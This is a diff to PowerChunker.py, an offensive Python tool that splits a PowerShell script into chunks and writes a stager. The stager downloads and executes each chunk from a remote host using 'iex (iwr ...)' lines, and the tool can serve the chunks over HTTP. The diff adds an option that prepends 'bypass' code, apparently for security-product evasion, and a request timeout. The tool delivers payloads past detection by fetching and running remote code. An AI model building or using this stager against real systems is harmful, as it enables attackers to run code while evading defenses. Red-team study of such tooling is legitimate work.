@@ -7,18 +7,18 @@ import secrets
 import string
 
 inspiration = """
-/\\     __    PowerChunker.py!!!            
-  \\ .-':::.         (by @icyguider)                       
-   \\ :::::|\\                              
-  |,\\:::'/  \\     why is there hamburger? 
-  `.:::-'    \\                             
-    `-.       \\         ___                
-       `-.     |     .-'';:::.              
-          `-.-'     / ',''.;;;\\            
-                   |  ','','.''|            
-              AsH  |\\  ' ,',' /'           
-                   `.`-.___.-;'             
-                     `--._.-'                                                           
+/\\     __    PowerChunker.py!!!
+  \\ .-':::.         (by @icyguider)
+   \\ :::::|\\
+  |,\\:::'/  \\     why is there hamburger?
+  `.:::-'    \\
+    `-.       \\         ___
+       `-.     |     .-'';:::.
+          `-.-'     / ',''.;;;\\
+                   |  ','','.''|
+              AsH  |\\  ' ,',' /'
+                   `.`-.___.-;'
+                     `--._.-'
 """
 
 
@@ -31,11 +31,23 @@ def generate_name(alphabet, length=12, exclude=None):
     return name
 
 
-def main(filename, host, outdir, stagername, serve, randomize):
+def main(filename, host, outdir, bypass, stagername, serve, randomize, timeout):
     alphabet = string.ascii_letters + string.digits
-    f = open(filename, "r")
-    sample = f.readlines()
-    f.close()
+    sample = []
+    # Prepend bypass code if specified
+    if bypass is not None:
+        with open(bypass, "r") as f:
+            sample.extend(f.readlines())
+
+    # Read in powershell script
+    with open(filename, "r") as f:
+        sample.extend(f.readlines())
+
+    # Remove extra spaces from lines
+    sample = [x.strip() for x in sample]
+
+    # Remove comments and blank lines from ps1 script
+    sample = [x for x in sample if x != "" and not x.startswith("#")]
 
     real = []
     multiline = False
@@ -49,18 +61,19 @@ def main(filename, host, outdir, stagername, serve, randomize):
         if '"@' in line:
             real.append(line)
             multiline = False
-            done = "".join(real)
+            done = "\n".join(real)
+            real.clear()
             if randomize:
                 name = generate_name(alphabet=alphabet, exclude=names)
                 names.append(name)
             else:
                 name = count
             with open("{}{}.ps1".format(outdir, name), "w+") as f:
-                f.write(done)     
+                f.write(done)
             count += 1
         if multiline == True:
             real.append(line)
-        if multiline == False:
+        else:
             if '"@' not in line:
                 if randomize:
                     name = generate_name(alphabet=alphabet, exclude=names)
@@ -75,19 +88,33 @@ def main(filename, host, outdir, stagername, serve, randomize):
 
     stager = []
     for x in names if randomize else range(1, count):
-        stager.append("iex (iwr -UseBasicParsing {}/{}.ps1)\n".format(host, x))
+        if timeout > 0:
+            stager.append(
+                "iex (iwr -UseBasicParsing -TimeoutSec {} {}/{}.ps1)\n".format(
+                    timeout, host, x
+                )
+            )
+        else:
+            stager.append("iex (iwr -UseBasicParsing {}/{}.ps1)\n".format(host, x))
 
     with open("{}{}".format(outdir, stagername), "w+") as f:
         f.write("".join(stager))
 
-    print(
-        "[!] PowerChunker Stager written to: {}{}\n    Execute like so: iex (iwr -UseBasicParsing {}/{})".format(
-            outdir, stagername, host, stagername
+    if timeout > 0:
+        print(
+            "[!] PowerChunker Stager written to: {}{}\n    Execute like so: iex (iwr -UseBasicParsing -TimeoutSec {} {}/{})".format(
+                outdir, stagername, timeout, host, stagername
+            )
         )
-    )
+    else:
+        print(
+            "[!] PowerChunker Stager written to: {}{}\n    Execute like so: iex (iwr -UseBasicParsing {}/{})".format(
+                outdir, stagername, host, stagername
+            )
+        )
 
     if serve is True:
-        PORT = 80
+        PORT = 9080
         Handler = http.server.SimpleHTTPRequestHandler
         with socketserver.TCPServer(("", PORT), Handler) as httpd:
             print("[+] Serving at port:", PORT)
@@ -128,12 +155,28 @@ parser.add_argument(
     default="chunker.ps1",
 )
 parser.add_argument(
+    "-b",
+    "--bypass",
+    dest="bypass",
+    help="Prepend bypass code from file (Optional)",
+    metavar="bypass.ps1",
+)
+parser.add_argument(
     "-r",
     "--random",
     dest="random",
     help="Randomize output filenames (except final stager)",
     action="store_true",
 )
+parser.add_argument(
+    "-t",
+    "--timeout",
+    dest="timeout",
+    help="Timeout for requests (Optional)",
+    default=0,
+    type=int,
+)
+
 if len(sys.argv) < 3:
     parser.print_help()
     sys.exit()
@@ -146,8 +189,26 @@ try:
         if args.file is None or args.host is None or args.serve is None:
             raise Exception()
         else:
-            main(args.file, args.host, args.dir, args.out, args.serve, args.random)
+            main(
+                args.file,
+                args.host,
+                args.dir,
+                args.bypass,
+                args.out,
+                args.serve,
+                args.random,
+                args.timeout,
+            )
     else:
-        main(args.file, args.host, args.dir, args.out, args.serve, args.random)
+        main(
+            args.file,
+            args.host,
+            args.dir,
+            args.bypass,
+            args.out,
+            args.serve,
+            args.random,
+            args.timeout,
+        )
 except:
     sys.exit()
